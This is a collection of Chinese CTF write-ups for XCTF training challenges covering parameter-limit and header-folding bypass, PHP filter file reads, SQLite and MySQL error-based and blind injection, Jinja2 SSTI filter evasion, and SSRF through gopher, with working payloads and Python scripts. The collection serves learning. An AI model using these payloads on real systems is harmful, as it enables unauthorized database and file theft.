本体两个知识点分别是： 1.express的parameterLimit默认为1000 2.根据rfc，header字段可以通过在每一行前面至少加一个SP或HT来扩展到多行 第一点：来自源代码的这一行。结合这篇文章的分析，当我们传入的参数超过1000个时，之后的参数会被舍弃掉。于是这里我们最开始发个\"admin\":\"t\"设置好admin的值，加上999个没用的参数，把程序拼接的&amp;admin=false挤掉，即可绕过过滤。 第二点：header 字段可以通过在每一行前面至少加一个SP 或 HT 来扩展到多行。以此绕过对 headers 的过滤，也就是： ​ 要求headers里的admin字段包含’true’就行了，可以是’xtrue’，这里根据RFC 7230(HTTP/1.1协议的定义)的规定，规定了 field-name 是由一个或多个打印的 ASCII 字符组成，不包括分隔符，包括空格。因此，如果一个 field-name 的第一个字符是空格，那么这个 HTTP header 是非法的，应该被服务器或客户端忽略或拒绝，然而，Node.js 在处理这类情况时通常是宽容的。 最终的post的内容： {\"headers\": [\"admin: x\", \" true: y\"]} //注意这里true前有个空格 这样写可以绕过php代码中的die(“try hard”) 该headers在nodejs解析的时候，会得到如下数据： { \"admin\": \"x true y\" } 经nodejs解析后admin字段包含‘true’，满足条件。 python脚本如下： import requests import json from abc import ABC from flask.sessions import SecureCookieSessionInterface url = \"http://61.147.171.105:58035/\" datas = {\"headers\": [\"xx:xx admin: true\", \"Content-Type: application/json\"], \"params\": {\"admin\": \"true\"}} for i in range(1020): datas[\"params\"][\"x\" + str(i)] = i headers = { \"Content-Type\": \"application/json\" } json1 = json.dumps(datas) print(json1) resp = requests.post(url, headers=headers, data=json1) print(resp.content) 总结： 到这里对我这个菜鸡就有难度了，不借鉴wp根本不行，但是也应该主动出击，遇到这种看到了源码，应该仔细分析，比如一看那个js我没有想到，这是一个web框架express，或许知道了后可以多去了解了解有什么相关特性或者漏洞，有可能就有所思路，不至于一股脑的照搬。 参考文章： wp参考一 wp参考二","categories":["攻防世界"]},{"title":"攻防世界-ezbypass-cat","path":"/2023/08/22/ezbypass-cat/","content":"题目描述： ezbypass-cat 题目解题： 打开是一个登录页面，依旧尝试弱口令，但没有效果，只清楚用户名一定有admin，且密码经过了加密，不能爆破，页面源代码也没啥信息，所以我就开始扫网站，随后发现了几处信息泄露：/user/login，/v2/api-docs等等。 之后就不知道如何利用了，只是感觉是未授权访问漏洞，应该是想办法遍历到用户名与密码的一些数据吧。。。 看了wp才发现，dirsearch会直接爆破flag.html。。。。。难道我的字典这么弱吗，奇怪。 直接访问看看，发现网站会自动重定向，那我们只能抓包了，结果发现直接访问url/flag.html竟然不行，于是考虑一下目录穿越 访问url/index.html/…/flag.html在抓包，参考了一些wp发现，以login开头的登录界面一般是白名单，故要以index.html开头","categories":["攻防世界"]},{"title":"攻防世界-文件包含","path":"/2023/08/22/wen-jian-bao-han/","content":"题目描述： 简单的文件包含-泰山杯 题目解题： 果然，代码很简单，但肯定过滤的很伤感~，简单测试几下 发现被过滤了，随后又测试了一番，发现过滤了一些关键字，那肯定就用到php伪协议+convert转换过滤器，不过这里没有深入总结，此次就总结一番。 convert转换过滤器 常见的convert转换过滤器有这两种： convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; convert.quoted-printable-encode 对于第一种来说，它通过 PHP 的 iconv 扩展实现，该扩展可以帮助将输入数据从指定的字符编码（）转换为另一个字符编码（） 其中input-encoding、output-encoding支持的编码格式为： UCS-4* UCS-4BE UCS-4LE* UCS-2 UCS-2BE UCS-2LE UTF-32* UTF-32BE* UTF-32LE* UTF-16* UTF-16BE* UTF-16LE* UTF-7 UTF7-IMAP UTF-8* ASCII* EUC-JP* SJIS* eucJP-win* SJIS-win* ISO-2022-JP ISO-2022-JP-MS CP932 CP51932 SJIS-mac（别名：MacJapanese） SJIS-Mobile#DOCOMO（别名：SJIS-DOCOMO） SJIS-Mobile#KDDI（别名：SJIS-KDDI） SJIS-Mobile#SOFTBANK（别名：SJIS-SOFTBANK） UTF-8-Mobile#DOCOMO（别名：UTF-8-DOCOMO） UTF-8-Mobile#KDDI-A UTF-8-Mobile#KDDI-B（别名：UTF-8-KDDI） UTF-8-Mobile#SOFTBANK（别名：UTF-8-SOFTBANK） ISO-2022-JP-MOBILE#KDDI（别名：ISO-2022-JP-KDDI） JIS JIS-ms CP50220 CP50220raw CP50221 CP50222 ISO-8859-1* ISO-8859-2* ISO-8859-3* ISO-8859-4* ISO-8859-5* ISO-8859-6* ISO-8859-7* ISO-8859-8* ISO-8859-9* ISO-8859-10* ISO-8859-13* ISO-8859-14* ISO-8859-15* ISO-8859-16* byte2be byte2le byte4be byte4le BASE64 HTML-ENTITIES（别名：HTML） 7bit 8bit EUC-CN* CP936 GB18030 HZ EUC-TW* CP950 BIG-5* EUC-KR* UHC（别名：CP949） ISO-2022-KR Windows-1251（别名：CP1251） Windows-1252（别名：CP1252） CP866（别名：IBM866） KOI8-R* KOI8-U* ArmSCII-8（别名：ArmSCII8） 对于本题，payload为： ?filename=php://filter/convert.iconv.UTF-8.UTF-16/resource=check.php 回显如下： 说明过滤器正确，但用法错误，此时可以bp爆破一下正确的组合情况 找到有回显的，即是正确的，我们直接用其读取flag ?filename=php://filter/convert.iconv.SJIS%2a.UCS-4%2a/resource=flag.php 参考文章： wp参考一 wp参考二","categories":["攻防世界"]},{"title":"攻防世界-FlatScience","path":"/2023/08/22/flatscience/","content":"题目描述： 无 题目解题： 打开题目，没啥信息，只能点击链接看看，发现都是些高深的pdf。。。初步认为没啥用，于是用Acunetix扫了一下这个网站，发现 那我们访问看看，admin.php 尝试了几下弱口令，没啥用，但页面提示nono，stop，看源代码 提示我们不要挣扎了，根本绕不了一点。。。，那我们估计相信，这里先不考虑了 login.php 感觉是sql注入，尝试一下万能密码 发现页面报错，估计就是了，并且过滤了#，那我们试试–+ 发现输入后跳转到了index.php，这估计是成了，之后bp抓包试了半天，我以为注入点在用户名上。 随后试了半天判断出其为字符型注入，且字段数为2 且如上图，回显位为2 随后查看了页面源代码，箭头表示移出debug参数，这时我就想到会不会是url传一个debug参数，于是乎有了接下来的 发现回显了源代码 &lt;?php ob_start(); ?&gt; &lt;?php if(isset($_POST['usr']) &amp;&amp; isset($_POST['pw'])){ $user = $_POST['usr']; $pass = $_POST['pw']; $db = new SQLite3('../fancy.db'); $res = $db-&gt;query(\"SELECT id,name from Users where name='\".$user.\"' and password='\".sha1($pass.\"Salz!\").\"'\"); if($res){ $row = $res-&gt;fetchArray(); } else{ echo \"&lt;br&gt;Some Error occourred!\"; } if(isset($row['id'])){ setcookie('name',' '.$row['name'], time() + 60, '/'); header(\"Location: /\"); die(); } } if(isset($_GET['debug'])) highlight_file('login.php'); ?&gt; SQLLite3 根据报错SQLLite3找到对应的查询数据库的代码 CppSQLite3Queryquery = db.execQuery(\"select * fromtarget_table\"); while(!query.eof()) { cout&lt;&lt;\"name:\"&lt;&lt;query.getStringField(\"name\")&lt;&lt;\"age : \"&lt;&lt;query.getIntField(\"age\")&lt;&lt;endl; query.nextRow(); } query.finalize(); CppSQLite3Query是一个查询返回对象，查询完后可以利用此类。这里就使用CppSQLite3DB的一个函数 execQuery，只要将查询sql传入即可。 eof函数：判断是否还有数据； nextRow函数：移到下一条记录； getStringField函数：获得相应字段的内容，以字符串形式返回； getIntField函数：获得相应字段的内容，以整形形式返回。 结合上述源代码： 找到关键代码SQL语句： \"SELECT id,name from Users where name='\".$user.\"' and password='\".sha1($pass.\"Salz!\").\"'\" 通过SQL语句注入构建我们设计出如下查询的SQL语句： ' union select name,sql from sqlite_master-- 至于为何是该语句： SQLite数据库中存在一个sqlite_master默认表，类似于mysql中的information_schema，可以在sqlite_master中查看所有的表名，以及之前执行过的建表语句，详细内容如下： sqlite_master ---- SQLite的系统表。该表记录数据库中保存的表，索引，视图和触发器信息。在创建sqlite数据库时该表会自动创建，sqlite_master表包含5个字段： type ---- 记录该项目的类型，如：table、index、view、trigger name ---- 记录该项目的名称，如：表名、索引名等 tbl_name ---- 记录所从属的表名，如索引所在的表名。对于表来说该列就是表名本身。 rootpage ---- 记录项目在数据库页中存储的编号。对于试图和触发器该字段为0或者NULL sql ---- 记录创建该项目的sql语句 so，我们可以构造如下所示的sql语句 select tbl_name from sqlite_master ---- 查询所有的表名 select sql from sqlite_master ---- 查询执行过的sql语句 select sql from sqlite_master where type='table' and tbl_name='Users' ---- 查询创建Users表的sql语句 首先查到表名，再通过创建表的sql语句查到表中的字段信息，应用如下 表名：Users：1' union select 1, tbl_name from sqlite_master--+ Users表的字段：1' union select 1, sql from sqlite_master where type='table' and tbl_name='Users'--+ +CREATE+TABLE+Users%28id+int+primary+key%2Cname+varchar%28255%29%2Cpassword+varchar%28255%29%2Chint+varchar%28255%29%29; url-decode: CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255)); Users表有四个字段：id，name，password，hint，利用group_concat()分别查询name，password和hint字段。执行如下所示的命令 1' union select 1,group_concat(name,\"++++\") from Users --+ 1' union select 1,group_concat(password,\"++++\") from Users --+ 1' union select 1,group_concat(hint,\"++++\") from Users --+ 分别输出 1.+admin%2B%2B%2B%2Bfritze%2B%2B%2B%2Bhansi; //解码得到: admin++++fritze++++hansi; 2.+3fab54a50e770d830c0416df817567662a9dc85c%2B%2B%2B%2B54eae8935c90f467427f05e4ece82cf569f89507%2B%2B%2B%2B34b0bb7c304949f9ff2fc101eef0f048be10d3bd; //解码得到: 3fab54a50e770d830c0416df817567662a9dc85c++++54eae8935c90f467427f05e4ece82cf569f89507++++34b0bb7c304949f9ff2fc101eef0f048be10d3bd; 3.+my+fav+word+in+my+fav+paper%3F%21%2B%2B%2B%2Bmy+love+is%E2%80%A6%3F%2B%2B%2B%2Bthe+password+is+password; //解码得到 my fav word in my fav paper?!++++my love isâ¦?++++the password is password; //第三个说明关键词在该作者的论文中 综上所述，我们知道用户的密码是由用户输入的密码连接\"Salz!\"字符串后经过sha1加密后得到的，也就是说我们需要通过脚本去爬取该作者的论文内容，让其与该字符串连接后在经过sha1加密得到的字段与数据库查询到的admin所对应的字段相等，那就是我们要的password 那考虑到我的水平，就做个脚本小子吧 import requests from bs4 import BeautifulSoup import os import re import hashlib from pdfminer.pdfparser import PDFParser from pdfminer.pdfdocument import PDFDocument from pdfminer.pdfpage import PDFPage from pdfminer.pdfpage import PDFTextExtractionNotAllowed from pdfminer.pdfinterp import PDFResourceManager from pdfminer.pdfinterp import PDFPageInterpreter from pdfminer.layout import * from pdfminer.converter import PDFPageAggregator # 将pdf转换为txt的函数 def pdf2txt(path): # 打开PDF文件 pdfFile = open(path, 'rb') # 创建pdf文档分析器 parser = PDFParser(pdfFile) # 创建PDF文档对象存储文档结构 document = PDFDocument(parser) # 检查文件是否允许文本提取 if not document.is_extractable: raise PDFTextExtractionNotAllowed # 创建PDF资源管理器对象来存储共享资源 resource = PDFResourceManager() # 设定参数进行分析 laparams = LAParams() # 创建一个PDF设备对象 device = PDFPageAggregator(resource, laparams=laparams) # 创建一个PDF解释器对象 interpreter = PDFPageInterpreter(resource,device) # 创建存储转换结果的同名txt文件 fileName = str(path.split(\".\")[0]) newFileName = fileName + \".txt\" f = open(newFileName, \"w\") # 处理每一页 for page in PDFPage.create_pages(document): interpreter.process_page(page) # 接受该页面的LTPage对象 layout = device.get_result() for x in layout: if (isinstance(x, LTTextBoxHorizontal)): # 写入txt文件 try: f.writelines(x.get_text() + \" \") except: pass f.close() # 下载所有pdf文件的函数 def downloadpdf(): pdfUrl = [] # 存放所有pdf文件的连接 # 爬取所有的pdf文件的连接 urlList = [ \"http://220.249.52.134:44174/\", \"http://220.249.52.134:44174/1/index.html\", \"http://220.249.52.134:44174/1/2/index.html\", \"http://220.249.52.134:44174/1/2/4/index.html\", \"http://220.249.52.134:44174/1/2/5/index.html\", \"http://220.249.52.134:44174/1/3/index.html\", \"http://220.249.52.134:44174/1/3/6/index.html\", \"http://220.249.52.134:44174/1/3/7/index.html\", \"http://220.249.52.134:44174/1/3/7/8/index.html\" ] for each in urlList: r = requests.get(url=each) soup = BeautifulSoup(r.text, 'lxml') result = soup.find_all(name=\"a\", attrs={\"title\":\"my very fav paper\"}) for tmp in result: if tmp[\"href\"].endswith(\".pdf\"): pdfUrl.append(each.split(\"index.html\")[0] + tmp[\"href\"]) # 使用curl -O 命令下载pdf文件 for each in pdfUrl: os.system(\"curl -O \" + each) # 取hash值的函数 def sha1(msg): sha1 = hashlib.sha1() sha1.update((msg + \"Salz!\").encode(\"utf-8\")) return sha1.hexdigest() # 破解密码的函数 def getpassword(): passlist = { \"3fab54a50e770d830c0416df817567662a9dc85c\":\"admin\", \"54eae8935c90f467427f05e4ece82cf569f89507\":\"fritze\", \"34b0bb7c304949f9ff2fc101eef0f048be10d3bd\":\"hansi\" } for each in os.listdir(os.curdir): # 取出txt文件 if each.endswith(\".txt\"): with open(each, \"r\") as file: a = file.read() b = re.split(r\"[\\s\\,\\;\\.]+\", a) # 将单词分割出来 c = [] tmp = \"\" judge = False # 处理以-结尾的行，最终的结果保存在c中 for each in b: if each.endswith(\"-\"): tmp = each.split(\"-\")[0] judge = True elif judge: c.append(tmp + each) judge = False else: c.append(each) # 遍历c碰撞得到密码 for each in c: print(each) if sha1(each) in passlist: return \"----\" + passlist[sha1(each)] + \"'s password is \" + each + \"Salz!\" + \"----\" def main(): os.chdir(os.curdir + os.sep + \"pdfdir\") # 修改工作目录 downloadpdf() # 下载pdf文件 # 将所有pdf文件转换成txt文件 for each in os.listdir(os.curdir): pdf2txt(each) # 遍历所有的txt文件得到密码 password = getpassword() return password if __name__ == \"__main__\": print(main()) 这个脚本是可以走出来的，不过似乎是我却一直报错，随后又看了了几篇wp，发现这里竟然可以直接md5解密？？ ThinJerboaSalz! //很好办了，出去salz，就是密码了：ThinJerboa 于是去了解了一番sha1与md5加密，我之前一直认为这两个加密是本质上的不同的，结果并不是。。。 并且这种做法有一定风险，因为不一定能查到，这里我查到了： 1、安全性不同 SHA-1 的安全性比MD5高。相对MD5而言，SHA-1的安全性比较高一些，如果单纯使用MD5可能比较容易遭到撞库攻击。通过预先计算知道MD5的对应关系，存在数据库中，然后使用的时候反查。 2、校验值的长度不同 MD5校验位的长度是16个字节（128位）；SHA-1是20个字节（160位）； 3、运行速度不同 SHA-1 的运行速度比MD5慢。 参考文章： wp参考一 wp参考二","categories":["攻防世界"]},{"title":"攻防世界-Confusion1","path":"/2023/08/21/confusion1/","content":"题目描述： 某天，Bob说：PHP是最好的语言，但是Alice不赞同。所以Alice编写了这个网站证明。在她还没有写完的时候，我发现其存在问题。(请不要使用扫描器) 题目解题： 进入页面，源代码也没啥信息，看一下其他页面，页面都一样，查看源代码 发现每个页面都有这两条注释信息，访问也没啥用，初步只能证明他用的python的某个框架 然后我尝试在url后面加上49，发现该变量被解析了 但当我进一步搜寻基类时，便出现了 这里是过滤了class，mro，subclasses，base。那就可以字符串拼接，或者利用request 随后回想到之前的源代码，显示 &lt;!--Flag @ /opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt--&gt; &lt;!--Salt @ /opt/salt_b420e8cfb8862548e68459ae1d37a1d5.txt--&gt; 那很好想，这个txt就是flag所在文件了，那我们就应该利用read函数，但read也被过滤 payload1： {{''[\"__c\"\"lass__\"][\"__mr\"\"o__\"][2][\"__subcl\"+\"asses__\"]()[40] ('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[\"re\"\"ad\"]()}} payload2: {{''[request.args.a][request.args.b][2][request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()}}?&amp;a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read 参考文章： SSTI模板注入绕过（进阶篇）_yu22x的博客-CSDN博客_ssti绕过 SSTI模板注入及绕过姿势(基于Python-Jinja2)_Y4tacker的博客-CSDN博客_ssti绕过","categories":["攻防世界"]},{"title":"攻防世界-Cat","path":"/2023/08/21/cat/","content":"题目描述： 抓住那只猫 题目解题： 那就随便输几下 测试几下发现只有127.0.0.1有回显，以为是命令执行，但似乎过滤了很多，手工有点难搞，那就用字典fuzz一下看看过滤了什么 看到如此之长的回显，惊呆了，看一下内容 用游览器打开并搜索flag，并没有，只能老老实实的进行代码审计 这里看到敏感词汇django，Python的模块Django之所以存在这个报错原因是因为： django报错页面将输入的参数传到了后端的django服务中进行解析，而django设置了编码为gbk导致错误编码了宽字符（超过了ascii码范围）。 参考wp：既然是django文件还有前端代码，复制后用游览器打开试试： 将html在浏览器中打开，可以看出后端运行Django，由于字符编码问题而报错。在请求信息POST一项中可以找到参数url，于是大致可以猜想到是PHP向本机的Django发出了POST请求，参数就是我们输入的url。 用游览器打开以后最底下可以看到一串提示：You’re seeing this error because you have DEBUG = True in your Django settings file. Change that to False, and Django will display a standard page generated by the handler for this status code. 也就是说，True in your Django settings file.有可能flag文件在 settings file 中。 直接搜索settings，会发现很多，但是比较特殊的有这个（和settings和database有关，百度搜索） PHP通常使用cURL库与作为客户端与服务器通信，在cURL库的CURLOPT_POSTFILEDS选项中可以找到突破口，借此我们可以爆出数据库内容 看其他大佬的文档，发现了@有关，php中curl函数@的作用PHP中curl的CURLOPT_POSTFIELDS参数使用细节 - 52php - 博客园 我们使用@进行文件传递，对文件进行读取之后还会把内容传给url参数，如果像上面一样有超出解析范围的编码的时候就会得到错误信息。 最终的payload：@/opt/api/database.sqlite3 在文中还需要搜索flag或者ctf等等关键字符： 找到flag 总结 URL编码：HTTP只能传输约定的ASCII字符（即ASCII码值127以内），若要传输其他字符和一些ASCII值在127以内的特殊字符，则需要对其转义——方法是在其十六进制ASCII值前加一个%，注意约定字符也可以编码但是效果一样。URL编码的临界值为%7F（127），由于计算机普遍存在的编码转换问题，我们常常可以在这里fuzz一下。 Django：Django是一个用python写成的web应用框架。 Django项目的目录布局如下： Django项目中app的目录布局如下： PHP的cURL库：PHP中的cURL库支持PHP作为客户端访问其他服务器，并支持多种协议。这里从报错信息中可以看出，与Django的交互是使用HTTP协议。 参考文章： wp参考一 wp参考二 wp参考三 具体的acunetix使用方式Acunetix Web Vulnerability 使用手册_林夕#的博客-CSDN博客_awvs使用手册","categories":["攻防世界"]},{"title":"攻防世界-very_easy_sql","path":"/2023/08/21/very-easy-sql/","content":"题目描述： 太简单了不描述了，给sql签个到吧 题目解题： 打开页面，这里说我们不是内部用户不能访问，那估计得利用ssrf，这里先测试一下表单。先尝试了弱口令，没用，在尝试万能密码：'or 1=1#，也没信息，那看一下源代码 发现php，访问一下 不出所料这里就是ssrf利用点。这里也是测试一番，发现只有输入127.0.0.1有反应 bp抓包看一下似乎也没啥信息，这里也就没思路，因为ssrf的利用不太会，因此就借鉴wp吧。 看了wp这里是要利用协议来实现内部访问 Gopher协议 ​ 定义：Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它； gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议 限制：gopher协议在各个编程语言中的使用限制Gopher协议格式： URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流 gopher的默认端口是70 如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码 剩下的细节就参考：gopher协议基础 gopher实战1：gopher协议的利用 - FreeBuf网络安全行业门户 gopher实战2：Gopher协议在SSRF漏洞中的深入研究（附视频讲解） - 知乎 (zhihu.com) ssrf参考：SSRF漏洞 - Saint_Michael - 博客园 (cnblogs.com) SSRF深入各种高级实战用法_G0mini的博客-CSDN博客 ssrf漏洞利用(内网探测、打redis) - ctrl_TT豆 - 博客园 (cnblogs.com) 粮食充足~ 抓包首页post表单发现响应包有set-cookie，wp说：有一个Set-Cookie代表如果输入正确的账号跟密码是可以返回的，可以尝试爆破 思来想去，这里应该就是结合ssrf来登录实现内部访问获取cookie 那这里就需要万能的gopher协议了，不过自身太菜，只能作为一个脚本小子了，虽不会写但咱也得看懂 import urllib.parse #导入库 urllib.parse，用于URL解析与转码 content = \"uname=admin&amp;passwd=admin\" content_length = len(content) # 构造请求体内容 test =\\ \"\"\"POST /index.php HTTP/1.1 Host: 127.0.0.1:80 User-Agent: curl/7.43.0 Accept: */* Content-Type: application/x-www-form-urlencoded Content-Length: {} uname=admin&amp;passwd=admin\t# 这里似乎不用再次写 \"\"\".format(content_length) # 构造http请求 tmp = urllib.parse.quote(test) # 进行URL编码 new = tmp.replace(\"%0A\", \"%0D%0A\") # 将%0A替换为%0D%0A 把 换行符替换为\\r result = urllib.parse.quote(new) # 再次进行URL编码 print(\"gopher://127.0.0.1:80/_\"+result) # 输出结果 输出如下 gopher://127.0.0.1:80/_POST%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AUser-Agent%253A%2520curl/7.43.0%250D%250AAccept%253A%2520%252A/%252A%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252024%250D%250A%250D%250Auname%253Dadmin%2526passwd%253Dadmin%2509%2523%2520%25E8%25BF%2599%25E9%2587%258C%25E4%25BC%25BC%25E4%25B9%258E%25E4%25B8%258D%25E7%2594%25A8%25E5%2586%258D%25E6%25AC%25A1%25E5%2586%2599%250D%250A 这里抓包看回显，有两个cookie，那估计是我们在use页面直接访问127.0.0.1时，其cookie被上面的cookie覆盖了。那这里第二个cookie就是我们登录时得到cookie，那很明显这个cookie就是注入点。 报错注入 这里解码发现为admin，那现在就是测试闭合方式了，先测试admin’ # import urllib.parse host = \"127.0.0.1:80\" cookie=\"this_is_your_cookie=YWRtaW4nICM=\" test =\\ \"\"\"GET /index.php HTTP/1.1 Host: {} Connection: close Content-Type: application/x-www-form-urlencoded Cookie:{} \"\"\".format(host,cookie) tmp = urllib.parse.quote(test) new = tmp.replace(\"%0A\",\"%0D%0A\") result = urllib.parse.quote(new) print(\"gopher://\"+host+\"/_\"+result) 输出: gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nICM%253D%250D%250A%250D%250A 发现页面有报错信息，那我们就开始报错注入吧，这里看到near ‘’，那应该就是admin’)闭合的方式，我们直接测试看看 payload为：admin') and extractvalue(1, concat(0x7e, (select database()),0x7e)) # import urllib.parse import base64 host = \"127.0.0.1:80\" payload = \"admin') and extractvalue(1, concat(0x7e,(select database()),0x7e)) #\" base64_payload = str(base64.b64encode(payload.encode(\"utf-8\")), \"utf-8\") cookie=\"this_is_your_cookie=\"+base64_payload test =\\ \"\"\"GET /index.php HTTP/1.1 Host: {} Connection: close Content-Type: application/x-www-form-urlencoded Cookie:{} \"\"\".format(host,cookie) tmp = urllib.parse.quote(test) new = tmp.replace(\"%0A\",\"%0D%0A\") result = urllib.parse.quote(new) print(\"gopher://\"+host+\"/_\"+result) 输出： gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLChzZWxlY3QgZGF0YWJhc2UoKSksMHg3ZSkpICM%253D%250D%250A%250D%250A 查表： admin') and extractvalue(1, concat(0x7e, (select GROUP_CONCAT(table_name)from information_schema.tables WHERE table_schema='security'),0x7e)) # import urllib.parse import base64 host = \"127.0.0.1:80\" payload = \"admin') and extractvalue(1, concat(0x7e, (select GROUP_CONCAT(table_name)from information_schema.tables WHERE table_schema='security'),0x7e)) #\" base64_payload = str(base64.b64encode(payload.encode(\"utf-8\")), \"utf-8\") cookie=\"this_is_your_cookie=\"+base64_payload test =\\ \"\"\"GET /index.php HTTP/1.1 Host: {} Connection: close Content-Type: application/x-www-form-urlencoded Cookie:{} \"\"\".format(host,cookie) tmp = urllib.parse.quote(test) new = tmp.replace(\"%0A\",\"%0D%0A\") result = urllib.parse.quote(new) print(\"gopher://\"+host+\"/_\"+result) 输出: gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoc2VsZWN0IEdST1VQX0NPTkNBVCh0YWJsZV9uYW1lKWZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyBXSEVSRSB0YWJsZV9zY2hlbWE9J3NlY3VyaXR5JyksMHg3ZSkpICM%253D%250D%250A%250D%250A 这里有过滤，似乎是过滤了group_concat 查列：admin') and extractvalue(1, concat(0x7e, (select GROUP_CONCAT(column_name)from information_schema.columns WHERE table_name='flag'),0x7e)) # import urllib.parse import base64 host = \"127.0.0.1:80\" payload = \"admin') and extractvalue(1, concat(0x7e, (select GROUP_CONCAT(column_name)from information_schema.columns WHERE table_name='flag'),0x7e)) #\" base64_payload = str(base64.b64encode(payload.encode(\"utf-8\")), \"utf-8\") cookie=\"this_is_your_cookie=\"+base64_payload test =\\ \"\"\"GET /index.php HTTP/1.1 Host: {} Connection: close Content-Type: application/x-www-form-urlencoded Cookie:{} \"\"\".format(host,cookie) tmp = urllib.parse.quote(test) new = tmp.replace(\"%0A\",\"%0D%0A\") result = urllib.parse.quote(new) print(\"gopher://\"+host+\"/_\"+result) 输出： gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoc2VsZWN0IEdST1VQX0NPTkNBVChjb2x1bW5fbmFtZSlmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIFdIRVJFIHRhYmxlX25hbWU9J2ZsYWcnKSwweDdlKSkgIw%253D%253D%250D%250A%250D%250A 查内容 admin') and extractvalue(1, concat(0x7e, (select flag from flag),0x7e)) # import urllib.parse import base64 host = \"127.0.0.1:80\" payload = \"admin') and extractvalue(1, concat(0x7e, (select flag from flag),0x7e)) #\" base64_payload = str(base64.b64encode(payload.encode(\"utf-8\")), \"utf-8\") cookie=\"this_is_your_cookie=\"+base64_payload test =\\ \"\"\"GET /index.php HTTP/1.1 Host: {} Connection: close Content-Type: application/x-www-form-urlencoded Cookie:{} \"\"\".format(host,cookie) tmp = urllib.parse.quote(test) new = tmp.replace(\"%0A\",\"%0D%0A\") result = urllib.parse.quote(new) print(\"gopher://\"+host+\"/_\"+result) 输出： gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoc2VsZWN0IGZsYWcgZnJvbSBmbGFnKSwweDdlKSkgIw%253D%253D%250D%250A%250D%250A 此时出现了另一个问题，报错的回显最大位数为32位，此时我们只获得了32位，需要用substr函数进行分割读取： 分割读取 admin') and extractvalue(1, concat(0x7e, substr((SELECT flag from flag),30,32),0x7e)) # import urllib.parse import base64 host = \"127.0.0.1:80\" payload = \"admin') and extractvalue(1, concat(0x7e, substr((SELECT flag from flag),30,32),0x7e)) #\" base64_payload = str(base64.b64encode(payload.encode(\"utf-8\")), \"utf-8\") cookie=\"this_is_your_cookie=\"+base64_payload test =\\ \"\"\"GET /index.php HTTP/1.1 Host: {} Connection: close Content-Type: application/x-www-form-urlencoded Cookie:{} \"\"\".format(host,cookie) tmp = urllib.parse.quote(test) new = tmp.replace(\"%0A\",\"%0D%0A\") result = urllib.parse.quote(new) print(\"gopher://\"+host+\"/_\"+result) 输出： gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCBzdWJzdHIoKFNFTEVDVCBmbGFnIGZyb20gZmxhZyksMzAsMzIpLDB4N2UpKSAj%250D%250A%250D%250A 时间盲注 这里分享时间盲注脚本 import requests #导入库requests,用于发送HTTP请求，注意这个需要安装 import time #导入库time，用于计时 import base64 #导入库base64，用于转码 url = \"http://61.147.171.105:64317/use.php?url=\" #http://61.147.171.105:64317是网址及端口，需要更改；/use.php是源码提示的SSRF跳板网址；url=后接需要跳转的网址 flag = \"\" #准备输出flag字符串 for pos in range(1, 50): for i in range(33, 127): # poc=\"') union select 1,2,if(1=1,sleep(5),1) # \" #')注释，联合查询 1，2，延时注入猜测注入点 # security # poc=\"') union select 1,2,if(ascii( substr((database()),\"+str(pos)+\",1) )=\"+str(i)+\",sleep(2),1) # \" #联合查询，ascii编码延时注入猜测库名 # flag # poc=\"') union select 1,2,if(ascii( substr((select group_concat(table_name) from information_schema.tables where 